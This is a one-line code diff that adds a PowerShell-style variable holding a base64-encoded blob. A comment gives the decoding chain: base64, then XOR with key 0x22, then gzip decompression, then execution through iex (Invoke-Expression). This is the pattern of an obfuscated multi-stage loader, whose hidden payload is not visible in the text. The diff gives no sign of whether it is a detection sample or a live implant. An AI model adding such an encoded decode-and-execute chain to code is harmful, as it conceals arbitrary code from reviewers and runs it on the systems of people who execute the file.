@@ -1,0 +1,1 @@
+$p='PakqIoVBdUgg3dFWr3Ly6g4NcHLtCgsLkvD17Q/0F/Bpj2ruD+pr9wlrDwzzbRRwdfIPD2xv8CYikxENZA8iIiI='; # xor-key 0x22  # multi-stage: b64 → xor → gz → iex
